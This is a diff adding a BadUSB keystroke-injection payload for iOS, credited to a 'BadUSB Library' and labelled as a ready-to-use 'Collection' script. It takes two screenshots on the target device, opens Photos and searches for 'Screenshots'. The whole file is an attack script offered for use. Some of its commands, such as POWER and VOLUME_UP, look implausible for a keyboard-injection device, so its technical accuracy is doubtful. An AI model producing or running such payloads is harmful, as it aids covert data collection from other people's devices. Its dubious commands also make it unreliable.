@@ -1,0 +1,35 @@
+REM Title: iOS Screenshot Taker
+REM Author: BadUSB Library
+REM Description: Takes screenshots of the device
+REM Target: iOS 14.0+
+REM Category: Collection
+REM Type: Directly Ready
+
+REM Take screenshot
+DELAY 2000
+POWER
+DELAY 500
+VOLUME_UP
+ENTER
+DELAY 2000
+
+REM Take another screenshot
+DELAY 2000
+POWER
+DELAY 500
+VOLUME_UP
+ENTER
+DELAY 2000
+
+REM Open Photos app
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Photos
+ENTER
+DELAY 3000
+
+REM Navigate to Screenshots
+STRING Screenshots
+ENTER
+DELAY 2000
